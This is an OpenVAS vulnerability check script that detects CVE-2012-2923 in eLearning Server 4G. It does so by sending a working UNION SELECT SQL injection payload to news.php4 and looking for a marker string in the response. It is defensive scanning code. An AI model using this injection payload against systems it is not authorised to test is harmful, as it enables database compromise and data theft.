###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eLearning_server_53472.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# eLearning Server 4G Remote File Include and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "eLearning Server 4G is prone to a remote file-include issue and an SQL-
injection issue.

A successful exploit may allow an attacker to execute malicious code
within the context of the webserver process, compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

eLearning Server 4G is vulnerable; other versions may also be
affected.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103488");
 script_cve_id("CVE-2012-2923");
 script_bugtraq_id(53472);
 script_version ("$Revision: 9352 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("eLearning Server 4G Remote File Include and SQL Injection Vulnerabilities");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53472");
 script_xref(name : "URL" , value : "http://www.hypermethod.ru/");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-05-14 10:31:27 +0200 (Mon, 14 May 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/news.php4?nid=-12'+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*";

  if( http_vuln_check( port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
